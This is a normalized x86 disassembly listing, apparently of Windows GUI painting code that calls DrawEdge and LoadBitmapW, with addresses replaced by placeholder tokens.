mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub edx eax
sub edx 0x10
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
mov edx [ esi ]
cmp eax [ edx + 0x3c ]
jle r-xdata
mov eax [ ebp - 0x48 ]
dec eax
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x40 ]
inc eax
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi edi
lea edi [ eax - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ esi ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ esi ]
call sub_4637c0
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov ecx [ ebp + 0x8 ]
add edx eax
lea eax [ ebp - 0x68 ]
pop ecx
call sub_432b28
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x35 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov edx [ esi ]
movzx edx [ edx + 0x35 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x2c ]
sub edx [ ecx + 0x30 ]
sar edx 0x1
jns r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x1c ]
sub [ edi + 0xc ] eax
push 0x0
push edi
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov [ edi + 0x8 ] eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x1c ]
push edx
mov edx [ esi ]
mov edx [ edx + 0x3c ]
push edx
mov edx [ esi ]
movzx edx [ edx + 0x35 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub ecx eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub ecx [ edx + 0x34 ]
sar ecx 0x1
jns r-xdata
adc edx 0x0
mov eax edi
xor edx edx
call sub_432b28
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ esi ]
call sub_4637c0
mov eax [ esi ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
adc ecx 0x0
mov eax [ esi ]
mov ecx [ eax + 0x48 ]
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e488
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub edx eax
sar edx 0x1
jns r-xdata
add [ ebp - 0x68 ] edx
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x60 ] eax
adc edx 0x0
mov edx [ ebp + 0x8 ]
add ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44fa34
jmp r-xdata
adc ecx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464323
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ ebp - 0x64 ] edx
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
add eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
adc edx 0x0
mov eax [ esi ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
movzx eax [ eax + 0x5c ]
call sub_462374
test bl bl
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx eax
add edx eax
add edx [ ebp - 0x28 ]
add edx [ ebp - 0x24 ]
mov [ edi ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_46e724
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax [ ebp - 0x10 ]
sub eax [ ebp - 0x28 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
call sub_4634d8
jmp r-xdata
sub_46433c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_464c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_46df1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_46d5ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_46df1c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x18 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x3c ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x18 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x14 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x48 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov esi [ eax + 0x48 ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x3c ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_4647cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x7ff8
push 0x0
call LoadBitmapW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4726b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_46d5ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x1c ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_46df1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_473a8c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46def0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e488
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x20 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x20 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x35 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44fa34
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df1c
mov eax [ ebp + 0x8 ]
inc [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_46d968
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x1c ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
pop ecx
call sub_46e254
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
call sub_46d5ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4481b0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor edx edx
call sub_432b28
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
or ecx 0xffffffff
xor edx edx
call sub_432b28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c9d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x5c ]
call sub_462374
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
